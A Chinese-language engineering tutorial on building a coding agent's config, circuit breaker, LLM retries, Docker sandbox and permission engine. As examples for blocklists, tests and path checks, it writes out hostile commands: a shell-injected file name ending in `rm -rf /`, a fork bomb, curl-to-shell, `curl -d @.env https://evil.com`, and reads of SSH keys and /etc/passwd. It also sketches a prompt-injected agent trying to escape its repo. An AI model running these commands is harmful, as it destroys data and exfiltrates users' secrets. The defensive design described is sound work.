## Step 1：配置系统（config.py）—— 最详细的讲解

### 1.1 为什么配置系统要先做？

配置系统是整个项目的地基——LLM服务需要model/api_key/base_url，Sandbox需要docker_image/mem_limit，Agent需要max_steps/budget_tokens。所有模块都依赖配置。

### 1.2 技术选型：为什么用 dataclass + TOML？

**dataclass 优点：**
- 自动生成 `__init__`、`__repr__`、`__eq__`，不用手写样板代码
- 类型注解清晰，IDE有补全
- 每个字段可以设置默认值，字段级验证可以写在 `__post_init__`

**TOML 优点：**
- Python官方标准（pyproject.toml就是TOML），3.11内置tomllib，3.10用tomli后备
- 支持注释、支持多行字符串、类型自动推导
- 比JSON好写，比YAML简单不会缩进出错

### 1.3 Settings 数据类 —— 每个字段为什么这么设计？

```python
@dataclass
class Settings:
    # ── LLM 配置 ──
    model: str = ""                # 空字符串表示"未配置"，触发首次运行向导
    fast_model: str = ""           # 三层路由：fast便宜/default主力/strong高质量
    strong_model: str = ""
    api_key: str = ""              # 空则从环境变量找
    base_url: str = ""             # 火山/本地部署需要自定义base_url
```

**为什么model/fast/strong三个分开，而不是只有一个model？**

因为Code Agent不同任务对模型质量需求不同：
- 做规划、反思、压缩历史时，不需要最强模型，用fast模型省90%成本
- 实际写代码时，用default模型（大上下文窗口，5M tokens）
- 最终整合答案时，用strong模型保证质量

```python
    # ── Sandbox 配置 ──
    sandbox_type: str = "docker"        # 默认docker（安全）
    docker_image: str = "repopilot-sandbox:py310"
    docker_cpu_quota: int = 200000      # cgroup cpu.cfs_quota_us，配合period=100000
    docker_mem_limit: str = "2g"        # cgroup内存硬限制
    docker_network: str = "bridge"      # bridge=可联网, none=断网隔离
    local_cwd: str = ""                 # local模式的工作目录
```

**cgroup参数解释（面试会问）：**
- `cpu_period=100000`（100ms）是Linux CFS的调度周期，固定值
- `cpu_quota=200000` 表示在每个100ms周期内，容器最多用200ms的CPU时间，即2核
- 公式：`核数 = cpu_quota / cpu_period`，这里是 200000/100000 = 2
- `mem_limit="2g"`：超过2G内存会触发OOM Kill，防止Agent写死循环吃内存

```python
    # ── 权限配置 ──
    approval_mode: str = "confirm"     # auto=全放行, confirm=确认危险操作, edit-only=只读自动, deny=全拒绝
```

四种权限模式的设计参考Codex CLI：
- `auto`：完全信任模式，所有操作自动执行，适合脚本/CI场景
- `confirm`：默认模式，写文件/执行命令前弹出"允许/拒绝/编辑"提示
- `edit-only`：读操作自动放行（ls/cat/grep），写操作需要确认
- `deny`：只读模式，禁止任何修改，适合代码审查

```python
    # ── Agent 循环配置 ──
    max_steps: int = 50                # 防止无限循环
    budget_tokens: int = 200_000       # 单次任务总token预算
    tool_timeout: int = 30             # 每个工具调用超时秒数
    reflect_every: int = 5             # 每N步触发一次反思（后续实现）
    max_consecutive_failures: int = 5  # 连续失败次数上限
```

**为什么max_steps=50？**
- 真实编程任务（读文件→搜索→修改→跑测试→修复）通常10-30步完成
- 50步留有余量，超出说明Agent陷入循环，需要停止
- 防止API费用爆炸

**为什么budget_tokens=200_000？**
- 对应200K tokens，约15万汉字，足够长任务
- 用支持5M上下文的doubao-seed-evolving时可以调大，但一般200K足够

```python
    # ── 路径配置 ──
    home_dir: Path = field(default_factory=lambda: _expand(
        os.environ.get("REPOPILOT_HOME", "~/.repopilot")))
```

**为什么用 `field(default_factory=...)` 而不是直接写默认值？**

这是Python dataclass的一个经典坑：
```python
# ❌ 错误：所有Settings实例共享同一个list/dict/Path对象！
home_dir: Path = Path("~/.repopilot")

# ✅ 正确：每个实例创建时调用factory，生成独立对象
home_dir: Path = field(default_factory=lambda: Path("~/.repopilot"))
```

dataclass的默认值在类定义时求值（只执行一次），可变类型必须用default_factory。

```python
    # ── 压缩配置（后续compaction用） ──
    compact_micro_ratio: float = 0.7    # 上下文用到70%触发轻量压缩
    compact_auto_ratio: float = 0.85    # 用到85%强制压缩
    recent_keep_steps: int = 10         # 压缩时保留最近10轮不压缩
```

**压缩阈值怎么来的？**
- 大多数模型的max_tokens是输入+输出共享的，输入占满了输出就没空间
- 70%时做微压缩（只总结最早的几轮，保留全部细节），成本低
- 85%时做激进压缩（大量总结历史），保证后续有空间生成回答

### 1.4 路径属性设计

```python
@property
def sessions_dir(self) -> Path: return self.home_dir / "sessions"
@property
def state_db_path(self) -> Path: return self.home_dir / "state.sqlite"
# ... 其他路径
```

用`@property`而不是在__init__里创建，因为home_dir可能在__post_init__后被覆盖（比如从配置文件加载）。property每次访问时动态计算，永远和home_dir一致。

### 1.5 四层配置加载优先级（重点面试题）

```
优先级从低到高：
1. 硬编码默认值（Settings类字段默认值）
2. ~/.repopilot/config.toml（用户持久化配置）
3. 环境变量（REPOPILOT_XXX，CI/CD场景常用）
4. 代码显式覆写（Settings.load(xxx=yyy)，如CLI参数）
```

**为什么这个顺序？**
- 默认值保证代码能跑（至少不会None报错）
- 配置文件是用户的"长期偏好"
- 环境变量用于临时覆盖（如CI中指定不同的API Key）
- 代码覆写优先级最高，CLI参数是用户最直接的意图表达

**实现细节（`Settings.load()` 的核心逻辑）：**
```python
@classmethod
def load(cls, **overrides) -> "Settings":
    # 第一步：先解析home_dir！因为config.toml在home_dir里
    home_raw = overrides.get("home_dir") or os.environ.get("REPOPILOT_HOME", "~/.repopilot")
    home = _expand(home_raw)

    # 第二步：创建默认Settings（加载硬编码默认值）
    s = cls()
    s.home_dir = home
    s.ensure_dirs()

    # 第三步：读config.toml（如果存在）
    if s.config_file.exists():
        with open(s.config_file, "rb") as fh:
            data = tomllib.load(fh)
        core = data.get("core", {})
        for f in fields(cls):
            if f.name in core and f.name in cls._PERSISTED_FIELDS:
                setattr(s, f.name, core[f.name])

    # 第四步：环境变量覆盖
    for f_name, (env_key, converter) in cls._ENV_MAP.items():
        raw = os.environ.get(env_key)
        if raw is not None:
            setattr(s, f_name, converter(raw))  # converter处理str→int/bool转换

    # 第五步：显式overrides最高优先级
    for k, v in overrides.items():
        if hasattr(s, k):
            setattr(s, k, v)

    s.__post_init__()  # 最后统一校验
    # 自动派生fast/strong model
    if s.model and not s.fast_model:
        s.fast_model = s.model
    if s.model and not s.strong_model:
        s.strong_model = s.model
    return s
```

**关键细节：为什么必须先解析home_dir？**
因为config.toml在`~/.repopilot/config.toml`，如果home_dir还没确定，就不知道去哪里找配置文件。这是顺序依赖——配置加载的第一步必须是home_dir。

**环境变量类型转换问题：**
环境变量全是字符串，但`max_steps`需要int，`stream`需要bool，所以`_ENV_MAP`为每个变量指定了converter：
```python
"max_steps": ("REPOPILOT_MAX_STEPS", int),
"stream": ("REPOPILOT_STREAM", lambda v: v.lower() in ("1","true","yes")),
```
bool转换要特别处理——不能直接`bool("false")`因为这返回True（非空字符串都是True），必须用lambda显式判断值。

### 1.6 验证逻辑（__post_init__）

```python
def __post_init__(self):
    if self.sandbox_type not in ("docker", "local"):
        raise ValueError(f"sandbox_type must be docker|local, got {self.sandbox_type!r}")
    if self.approval_mode not in ("auto", "confirm", "edit-only", "deny"):
        raise ValueError(f"invalid approval_mode: {self.approval_mode!r}")
    if self.max_steps < 1:
        raise ValueError("max_steps must be >= 1")
    if self.budget_tokens < 1000:
        raise ValueError("budget_tokens must be >= 1000")
    for f in (self.model, self.fast_model, self.strong_model):
        if f and "/" not in f:
            raise ValueError(f"model must be in 'provider/model' format (LiteLLM)")
```

**为什么模型名必须带`provider/`前缀？**
LiteLLM靠前缀决定用哪个API：
- `openai/gpt-4o` → 走OpenAI格式API
- `anthropic/claude-3-sonnet` → 走Anthropic API
- `volcengine/doubao-xxx` → 走火山引擎API
- 没有前缀LiteLLM不知道用哪个协议

### 1.7 TOML持久化（save方法）

**设计原则：只写非默认值。**
```python
def save(self) -> None:
    defaults = Settings()  # 拿到默认值
    lines = [f"# RepoPilot configuration", f"[{self._TOML_SECTION}]", ""]
    for f in fields(self):
        val = getattr(self, f.name)
        if val == getattr(defaults, f.name):
            continue  # 等于默认值就不写，保持文件简洁
        # 根据类型输出TOML格式
        if isinstance(val, bool):
            lines.append(f"{f.name} = {'true' if val else 'false'}")
        elif isinstance(val, str) and val:
            escaped = val.replace("\\", "\\\\").replace('"', '\\"')
            lines.append(f'{f.name} = "{escaped}"')
```

**为什么不写默认值？**
- 保持config.toml简洁，用户一眼就能看到自己改了什么
- 未来版本升级改默认值时，用户的配置文件不会因为旧默认值而被锁定在旧行为

## Step 2：熔断器（circuit_breaker.py）

### 2.1 为什么需要熔断器？

想象这个场景：API Key过期了，每次LLM调用等25秒超时才报错。Agent循环50步，每步都超时重试2次=等待25×3×50=62.5分钟，全部失败。用户以为卡死了。

熔断器的作用：连续失败N次后，直接拒绝请求（快速失败），等一段时间放一个探测请求看看服务恢复没。

### 2.2 熔断器状态机

```
         失败率≥阈值
    Closed ─────────→ Open
      ↑                │
      │探测成功        │等待cooldown时间
      │                ↓
    Half-Open ←───────┘
         探测失败→重新Open
```

### 2.3 滑动窗口实现细节

```python
@dataclass
class CircuitBreaker:
    window: int = 20           # 窗口大小：只看最近20次调用
    min_calls: int = 5         # 最少5次调用才开始判断（样本不足不熔断）
    error_rate: float = 0.5    # 50%失败率触发熔断
    cooldown: float = 60.0     # 熔断60秒后进入半开
```

**为什么用deque实现滑动窗口？**
```python
self._calls: deque[int] = deque(maxlen=window)
```
`deque(maxlen=20)`自动维护一个定长队列：新元素加入时，如果超过20个自动把最老的弹出去。完美实现滑动窗口——永远只保留最近20次调用的结果（1=成功，0=失败）。

相比计数器方案（时间窗口），滑动窗口不会出现"窗口边界"问题（比如前一个窗口最后1秒大量失败，下一个窗口第一秒清零，误以为服务恢复）。

### 2.4 状态转换逻辑

```python
def record_failure(self):
    with self._lock:
        self._calls.append(0)  # 0表示失败
        if self._state == "half-open":
            # 半开状态下探测失败→立刻熔断
            self._state = "open"
            self._opened_at = time.time()
            return
        if len(self._calls) >= self.min_calls:
            failures = sum(1 for c in self._calls if c == 0)
            if failures / len(self._calls) >= self.error_rate:
                self._state = "open"
                self._opened_at = time.time()
```

**关键细节：**
- 半开状态下任何失败都立刻回到Open（不看错误率），因为探测请求就是来试的，失败说明服务还没恢复
- 只有在窗口内调用次数达到min_calls时才判断，避免样本量太小时误判（比如第1次调用就失败就熔断？不行）
- 用`threading.Lock()`保护所有状态修改，因为Agent可能有并发（比如后台任务和主循环同时调LLM）

```python
def allow_request(self) -> bool:
    with self._lock:
        if self._state == "closed":
            return True
        if self._state == "open":
            if time.time() - self._opened_at >= self.cooldown:
                self._state = "half-open"  # 冷却到了，进入半开放一个探测
                return True
            return False  # 还在冷却中，拒绝
        return True  # half-open放一个探测请求通过
```

### 2.5 参数怎么选的？

| 参数 | 值 | 理由 |
|------|-----|------|
| window=20 | 最近20次 | 太小会误判，太大会反应慢 |
| min_calls=5 | 至少5次 | 避免偶发错误触发熔断 |
| error_rate=0.5 | 50% | 不是100%才熔断，容忍偶发错误 |
| cooldown=60s | 60秒 | 给服务恢复时间，又不至于让用户等太久 |

### 2.6 怎么测试熔断器？

```python
def test_circuit_half_open_after_cooldown():
    cb = CircuitBreaker(window=10, min_calls=2, error_rate=0.5, cooldown=0.05)
    cb.record_failure()
    cb.record_failure()
    assert cb.allow_request() is False  # 熔断器打开
    time.sleep(0.1)                     # 等待冷却
    assert cb.allow_request() is True   # 进入半开，允许探测
    assert cb.state == "half-open"
    cb.record_success()                 # 探测成功→闭合
    assert cb.state == "closed"
```

**测试要点：**
- 测试用cooldown=0.05秒（不用真等60秒）
- 必须覆盖三种状态和所有转换路径
- 验证线程安全（可以多线程并发调用test，但当前用了lock应该安全）

## Step 3：LLM服务（llm/service.py）

### 3.1 三层模型路由和超时

```python
TIER_TIMEOUTS = {Tier.FAST: 15, Tier.DEFAULT: 25, Tier.STRONG: 40}
```

- Fast模型做简单任务（分类、总结），应该秒回，15秒超时够了
- Default模型做复杂代码生成，25秒
- Strong模型做深度推理（代码审查、复杂重构），40秒

### 3.2 重试机制详解

```python
for attempt in range(self.max_retries + 1):  # max_retries=2 表示最多3次调用
    try:
        resp = litellm.completion(**kwargs)
        self.cb.record_success()
        return self._parse_response(resp, kwargs["model"])
    except Exception as e:
        if not _is_retryable(e):
            self.cb.record_failure()
            raise  # 不可重试直接抛
        if attempt == self.max_retries:
            self.cb.record_failure()
            raise  # 重试用完了还是失败
        # 指数退避 + 全抖动
        delay = min(self.backoff_cap, self.backoff_base * (2 ** attempt))
        delay = delay * (0.5 + random.random() * 0.5)
        time.sleep(delay)
```

**指数退避计算（backoff_base=0.5, cap=8）：**
- 第1次重试：0.5 × 2^0 = 0.5s → 抖动后 0.25s~0.5s
- 第2次重试：0.5 × 2^1 = 1.0s → 抖动后 0.5s~1.0s
- 如果更多重试：2s → 4s → cap到8s封顶

**为什么加全抖动（full jitter）？**
如果不抖动，多个请求同时失败会在同一时刻重试，造成"重试风暴"——服务刚恢复就被一波重试打挂。抖动把重试时间打散，避免尖峰。这是AWS Architecture Blog推荐的最佳实践。

**重试和熔断器的配合：**
- 单次调用内：重试处理偶发错误（网络抖动、临时限流）
- 熔断器层面：多次调用持续失败后，快速拒绝新请求
- 每次top-level chat()调用（包括所有重试）最终失败才record_failure一次
- 每次成功（包括重试后成功）record_success一次

### 3.3 错误分类逻辑

```python
def _is_retryable(exc: Exception) -> bool:
    # 超时/连接错误/限流 → 重试
    if isinstance(exc, (openai.APITimeoutError, openai.APIConnectionError, openai.RateLimitError)):
        return True
    # 400 Bad Request（包括context length exceeded）→ 不重试
    if isinstance(exc, openai.BadRequestError):
        return False
    # 认证/权限/不存在 → 不重试（重试也没用，Key错了重试100次也错）
    if isinstance(exc, (openai.AuthenticationError, openai.PermissionDeniedError, openai.NotFoundError)):
        return False
    # 5xx服务端错误 → 重试
    if isinstance(exc, openai.APIStatusError):
        return exc.status_code == 429 or exc.status_code >= 500
```

**关键判断：context length exceeded为什么不重试？**
BadRequestError中最常见的是上下文超长（400 + "context_length_exceeded"），重试同样的请求同样会超长，没有意义。正确做法是压缩上下文后重试，这个在Agent层处理。

### 4.2 数据结构设计

**ExecResult的truncated()方法：**

LLM上下文窗口有限，命令输出可能有几MB（如pip install日志），全塞进去就爆了。所以长输出自动截断：
```python
def truncated(self, head=500, tail=1500) -> str:
    if len(out) <= head + tail + 50:
        return f"$ {self.command}\n{out}\n[exit_code={self.exit_code}]"
    keep_head = out[:head]      # 前500字符
    keep_tail = out[-tail:]     # 后1500字符
    skipped = len(out) - head - tail
    return f"$ {self.command}\n{keep_head}\n...[truncated {skipped} chars]...\n{keep_tail}\n[exit_code={self.exit_code}]"
```

**为什么head=500, tail=1500？**
- 大多数错误信息在尾部（Python traceback、编译错误最后几行最有用）
- 头部通常是命令本身和初始输出，看一眼什么命令就行
- 尾部给更多空间，因为关键信息在末尾

**FileReadResult带行号：**

LLM编辑代码时需要知道"第几行"，edit_file工具用字符串匹配，但LLM看代码时行号是重要参考。
```python
@staticmethod
def _add_line_numbers(text: str, start_line: int = 1) -> str:
    lines = text.splitlines()
    width = max(3, len(str(len(lines) + start_line)))  # 动态宽度对齐
    return "\n".join(f"{i:{width}}|{line}" for i, line in enumerate(lines, start_line))
```
输出格式：
```
  1|def add(a, b):
  2|    return a + b
  3|
  4|def subtract(a, b):
  5|    return a - b
```

### 4.3 路径穿越防护（安全核心）

```python
def _safe_path(self, user_path: str) -> Path:
    p = (self.repo_path / user_path).resolve()  # resolve()处理..和符号链接
    try:
        p.relative_to(self.repo_path)  # 如果p不在repo_path下，抛ValueError
    except ValueError:
        raise PermissionError(f"Path escapes repo: {user_path} -> {p}")
    return p
```

**攻击场景：** Agent被prompt注入，尝试读取`../../etc/passwd`或写入`~/.ssh/authorized_keys`。
**防御：** `resolve()`把相对路径解析为绝对路径，`relative_to()`验证绝对路径是否在repo内。如果不在就抛PermissionError。

**为什么这个防御不够（Docker沙盒的补充）？**
LocalSandbox的`_safe_path`是应用层检查，如果Agent找到绕过方法（比如符号链接），就可能逃逸。Docker沙盒在操作系统层面隔离——容器里根本看不到宿主机的其他文件，就算绕过了应用层检查也没用。

### 5.1 read_file分页实现

```python
def read_file(self, path: str, offset: int = 0, limit: int = 200) -> FileReadResult:
    with open(p, "r", encoding="utf-8", errors="replace") as f:
        all_lines = f.readlines()
    total = len(all_lines)
    start = max(0, offset)
    end = min(total, start + limit)
    selected = all_lines[start:end]
    numbered = self._add_line_numbers("".join(selected), start_line=start + 1)
    return FileReadResult(
        path=str(p.relative_to(self.repo_path)),
        content=numbered,
        start_line=start + 1,
        total_lines=total,
        truncated=end < total,  # 告诉LLM文件还有更多
    )
```

**为什么默认limit=200行？**
- 200行代码大约2000-4000 tokens，一次不会占用太多上下文
- LLM需要更多可以指定offset继续读（offset=200, limit=200读下一页）
- `truncated=True`告诉LLM"文件还没读完，需要更多继续offset"

**编码处理：** `errors="replace"`把无法解码的字节替换为``，不会因为二进制文件崩溃。

### 5.2 edit_file精确替换+diff生成

```python
def edit_file(self, path: str, old_string: str, new_string: str) -> str:
    original = p.read_text(encoding="utf-8", errors="replace")
    if old_string not in original:
        close = difflib.get_close_matches(old_string, original.splitlines(), n=1, cutoff=0.6)
        hint = f"\nClosest match:\n{close[0]!r}" if close else ""
        raise ValueError(f"old_string not found in {path}.{hint}")
    new_content = original.replace(old_string, new_string, 1)  # 只替换第一个匹配
    p.write_text(new_content, encoding="utf-8")
    diff = difflib.unified_diff(...)  # 返回unified diff给LLM看
    return "".join(diff)
```

**为什么edit_file比write_file好？**
- write_file覆盖整个文件，容易丢失未注意的内容
- edit_file精确替换，patch小，风险低
- 返回unified diff让LLM确认修改正确（如果diff不对可以重试）
- 这也是Codex/Claude Code的做法——优先用edit/replace而非write

**difflib智能提示：**
如果old_string没找到（可能LLM看到的版本和磁盘不一致），用`get_close_matches`找最相似的行，给LLM有用的错误提示，而不是简单说"not found"。

### 6.2 容器启动流程

```python
def setup(self):
    # 1. 检查镜像是否存在
    try:
        client.images.get(self.image)
    except:
        client.images.pull(self.image)  # 不存在就pull

    # 2. 启动容器
    self._container = client.containers.run(
        self.image,
        command=["sleep", "infinity"],   # 保活命令
        detach=True,                      # 后台运行
        working_dir="/workspace",
        mem_limit=self.mem_limit,         # "2g"
        cpu_period=100000,
        cpu_quota=self.cpu_quota,         # 200000 = 2核
        network_mode=self.network_mode,   # "bridge"或"none"
        mounts=[
            docker.types.Mount(
                "/workspace",
                str(self.repo_path.resolve()),
                type="bind",             # bind mount而非volume
                read_only=False,
            ),
        ],
    )
```

**为什么用`sleep infinity`而不是直接启动一个长运行服务？**
- `python:3.10-slim`镜像默认CMD是`python3`，会立刻退出
- `sleep infinity`让容器一直存活，然后通过`docker exec`在里面执行命令
- 类似"先开机，再登录进去操作"的模式
- 这是Docker SDK执行多个命令的标准模式

**bind mount vs volume：**
- bind mount：直接映射宿主机目录，修改实时双向同步。适合代码目录——Agent在容器内改文件，宿主机立刻看到。
- volume：Docker管理的存储，需要docker cp才能拷贝文件。适合数据库等持久化数据，不适合代码。

### 6.3 Docker exec流式执行（难点）

Docker SDK的exec有个坑：`exec_run()`不支持超时，命令卡死就永远等。所以自己实现流式exec+超时：

```python
def _docker_exec(self, cmd, timeout=30, workdir="/workspace"):
    t0 = time.time()
    exec_id = self._client.api.exec_create(
        self._container.id,
        ["sh", "-c", cmd],       # 用sh -c执行，支持管道/重定向
        workdir=workdir,
        environment={"DEBIAN_FRONTEND": "noninteractive", "PYTHONUNBUFFERED": "1"},
    )
    # exec_start返回generator，流式产出(stdout_bytes, stderr_bytes)元组
    stream = self._client.api.exec_start(exec_id, stream=True, demux=True)
    out_chunks, err_chunks = [], []
    timed_out = False
    for out_b, err_b in stream:
        if time.time() - start > timeout:
            timed_out = True
            break               # 超时直接break，不继续读
        if out_b: out_chunks.append(out_b)
        if err_b: err_chunks.append(err_b)
    stdout = b"".join(out_chunks)
    stderr = b"".join(err_chunks)
    # 获取exit code（必须在exec_start完成后inspect）
    inspect = self._client.api.exec_inspect(exec_id)
    exit_code = inspect.get("ExitCode", -1)
```

**demux=True是什么？**
Docker exec的输出是混在一个stream里的（stdout和stderr有8字节header区分）。demux=True让SDK帮我们拆分，返回(out, err)元组，不用自己解析Docker stream protocol。

**为什么不用`container.exec_run()`？**
- 高层API `container.exec_run()`会一次性返回所有输出，不支持流式读取
- 无法中途超时——只能等命令完成
- 底层API `client.api.exec_create`+`exec_start`更灵活

### 6.4 read_file用sed分页

容器内用sed命令实现分页读：
```python
def read_file(self, path, offset=0, limit=200):
    cp = self._container_path(path)
    if offset == 0:
        cmd = f"sed -n '1,{limit}p' {shquote(cp)}; echo __LINES__; wc -l < {shquote(cp)}"
    else:
        start = offset + 1
        end = offset + limit
        cmd = f"sed -n '{start},{end}p' {shquote(cp)}; echo __LINES__; wc -l < {shquote(cp)}"
```
用`echo __LINES__`分隔内容和总行数，避免发两次exec命令。

**为什么不通过mount直接读文件？**
其实可以（bind mount了），但为了一致性和安全性（路径都经过容器内路径处理），文件操作走容器内命令。实际write_file/edit_file利用了mount直接写宿主文件，更高效。

### 6.5 shell注入防护——shquote函数

```python
def shquote(s: str) -> str:
    """Single-quote a string for sh -c, safely."""
    return "'" + s.replace("'", "'\"'\"'") + "'"
```

**原理：**
- 在sh中，单引号内的所有字符都是字面量（无转义），包括`$`、`;`、`|`、空格
- 唯一问题是单引号本身不能放在单引号内
- 解决：`'it's'` → `'it'"'"'s'`，即：关闭单引号 → 双引号包裹单引号 → 重新开单引号
- 这是POSIX shell标准的安全引用方法

**攻击场景：** 如果不转义，Agent传入`file.py; rm -rf /`，就变成：
```bash
sed -n '1,200p' file.py; rm -rf /    # 危险！
```
用shquote后：
```bash
sed -n '1,200p' 'file.py; rm -rf /'  # 安全，;被当作文件名的一部分
```

## 测试体系总结

### 怎么写单元测试？

**原则：**
1. 每个测试只测一个行为
2. 外部依赖全部mock（LLM API、Docker Engine）
3. 文件系统操作用`tmp_path`（pytest内置，自动隔离自动清理）
4. 环境变量用`monkeypatch.setenv`（测试结束自动恢复）
5. 全局状态（如Settings单例）在测试后reset
6. 测试参数用极小值（cooldown=0.05s, backoff=0.001s）加速测试

**pytest fixtures用法：**
```python
@pytest.fixture
def tmp_repo(tmp_path):
    """创建临时测试仓库，包含测试文件"""
    (tmp_path / "main.py").write_text("def add(a, b):\n    return a + b\n")
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg/utils.py").write_text("def greet(name):\n    return f'Hello, {name}!'\n")
    cache = tmp_path / "__pycache__"
    cache.mkdir()
    return tmp_path
```
每个需要"假代码库"的测试函数加`tmp_repo`参数，pytest自动创建临时目录并注入。

**运行测试：**
```bash
pytest tests/ -v              # 详细模式
pytest tests/ -v --cov=repopilot  # 带覆盖率
pytest tests/test_llm.py -v   # 只跑某个文件
```

## Step 8：Permission Engine（权限引擎）

### 8.1 为什么Permission Engine不是Sandbox的重复？

Permission Engine和Sandbox是两层独立的防御：

| 层级 | 职责 | 拦截时机 |
|------|------|----------|
| **Permission Engine** | 用户体验层，减少不必要弹窗，已知危险操作立刻拦截 | Agent调用工具前，**在宿主机侧**决策 |
| **Sandbox（Docker）** | 真正的安全边界，操作系统级隔离 | 代码执行时，**在容器内**限制资源/文件/网络 |

Permission Engine 即使被绕过（prompt injection让Agent构造特殊命令），Docker沙盒仍然会兜底（bind mount只挂workspace、network=none断网、cgroups限制资源）。这是defense in depth（纵深防御）。

### 8.2 四种审批模式详解

```
auto模式（完全信任）：
  只读工具 → allow
  黑名单命中 → deny
  网络命令 → 看network_enabled
  其余 → allow（用户显式--approval-mode auto）

confirm模式（默认，推荐）：
  只读工具 → allow
  黑名单命中 → deny
  真正安全命令（is_safe_cmd判断） → allow
  代码执行(python -c)/网络(curl/pip)/环境(env)/写操作 → ask用户
  其余 → ask

edit-only模式（代码审查）：
  只读工具 → allow
  所有exec工具 → deny（不能跑命令）
  写工具 → ask
  黑名单 → deny

deny模式（只读审计）：
  只读工具 → allow
  其余 → deny
```

### 8.3 is_safe_cmd()的多层检测——为什么不能只看命令前缀？

第一版的`is_safe_cmd_prefix()`只检查argv[0]是否在白名单中，这导致大量绕过：

| 命令 | prefix检测 | 实际风险 | 现在的检测 |
|------|-----------|----------|-----------|
| `python -c "import os; os.system('sudo x')"` | python在白名单→allow | 执行任意代码，甚至调sudo | 检测`-c/-e/--eval` flag+解释器→ask |
| `cat /etc/passwd` | cat在白名单→allow | 读取系统文件 | 检测命令中包含`/etc/`、`~/.ssh/`等敏感路径→deny |
| `echo hi > /tmp/evil.sh` | echo在白名单→allow | 写任意文件 | 检测`>`/`>>`/`| tee`写操作符→ask |
| `env` | env不在白名单→auto下allow | 泄露API_KEY等环境变量 | env/printenv加入REQUIRE_CONFIRM→ask |
| `pip install unknown-pkg` | pip在白名单→allow | 安装恶意包、访问网络 | pip install加入网络命令检测→ask |
| `git push origin main` | git在白名单→allow | 推送代码到远程 | 区分git子命令：status/diff/log是safe，push/commit/clone→ask |
| `cat ../secret.txt` | cat在白名单→allow | 路径穿越读workspace外文件 | 检测`cat ../`、`> ../`→deny |

### 8.4 Safe命令严格标准

一个命令要被auto-allow必须同时满足：
1. argv[0]在`SAFE_CMD_PREFIXES`中（ls/cat/head/grep/pytest/git等）
2. 没有写操作符（`>`/`>>`/`| tee`）
3. 没有代码执行flag（python/node/bash的`-c`/`-e`/`-m`）
4. 不引用敏感路径（~/.ssh/、.env、/etc/）
5. 不访问系统绝对路径（`/etc/`、`/root/`、`/proc/`）
6. git命令必须是只读子命令（status/diff/log/show/log，不含push/commit/clone）
7. tar不包含`-x`（解压），unzip必须有`-l`（只列不拆）

### 8.5 黑名单正则模式

危险命令使用re.compile预编译正则匹配：

| 类型 | 正则示例 | 匹配示例 |
|------|----------|----------|
| 破坏性文件操作 | `rm -rf /`或`~`结尾 | `rm -rf /`、`rm -rf ~` |
| 提权 | `^\s*sudo\b` | 行首sudo |
| 远程代码执行 | `curl.*\|sh` | curl|sh, wget|bash, curl|python |
| 危险权限 | `chmod -R 777` | 递归777 |
| 破坏性git | `git push (-f|--force)` | force push |
| fork炸弹 | `:(){ :\|:& };:` | classic fork bomb |
| 编码绕过 | `base64.*\|sh` | base64解码管道到shell |
| 持久化注入 | `^\s*(source|\.)\s+~/` | source ~/.bashrc |
| 定时任务 | `^\s*crontab\b` | crontab操作 |
| 系统控制 | `^\s*(reboot|shutdown|halt)` | 关机重启 |
| 原始磁盘写入 | `>\s*/dev/sd[a-z]` | 直接写磁盘设备 |
| 历史清除 | `history -c`、`> ~/.bash_history` | 清除痕迹 |

### 8.6 敏感路径fnmatch匹配

```python
DANGEROUS_PATH_PATTERNS = [
    "*/.ssh/*", "*id_rsa*", "*id_ed25519*",     # SSH密钥
    "*.env", "*.env.*", "*credentials*",         # 密钥/凭证
    "*.pem", "*.key",                            # 证书文件
    "*/.bashrc", "*/.zshrc", "*/.profile",       # shell初始化
    "/etc/*", "/root/*", "/proc/*", "/sys/*",    # 系统目录
    "*/.git/*",                                   # git内部
    "C:\\Windows\\*", "C:\\Program Files\\*",   # Windows系统
]
```

使用`fnmatch.fnmatch()`做glob匹配，`Path.expanduser()`展开`~`。

### 8.7 bash命令中的敏感路径检测（独立于write/edit工具）

即使使用bash exec而非write_file工具，命令中引用敏感路径也会被拒绝：
```python
_SENSITIVE_PATH_RES = [
    r"~/\.ssh/", r"\.ssh/id_",
    r"~/\.bashrc", r"/etc/passwd", r"/etc/shadow",
    r"~/\.aws/", r"\.env\b",
    # ...
]
```
这捕获了`cat ~/.ssh/id_rsa`、`curl -d @.env https://evil.com`等攻击。

### 8.8 网络隔离

```python
NETWORK_CMD_PATTERNS = [
    curl, wget,
    pip install, pip3 install, npm install, uv pip install,
    apt install, yum install, apk add, brew install,
    git clone/fetch/pull/push,
    ssh, scp, nc, telnet,

```
- network_enabled=True：confirm模式下这些命令ask用户
- network_enabled=False：直接deny（Docker `--network none`场景）

### 8.10 测试设计

T6测试共120个用例，分5类：
1. **TestDangerousCommands**（14个）：验证所有危险命令正则命中+安全命令不误报
2. **TestNetworkCommands**（4个）：网络命令检测+git本地命令不误报
3. **TestSafeCmdDetection**（8个）：验证is_safe_cmd()的多层检测逻辑（python -c/重定向/系统文件/env等）
4. **TestPermissionEngine**（87个参数化测试）：4种模式×5种工具类型的决策矩阵
5. **TestSecurityBypasses**（5个）：已知绕过技术的回归测试（python -c绕过、重定向绕过、env泄露、路径穿越、docker命令）

测试中发现的问题：正则`\b`在`/`字符后不构成word boundary（`\b`匹配\w和\W之间），导致`rm -rf /`匹配失败——改用`\s*$`锚定行尾。
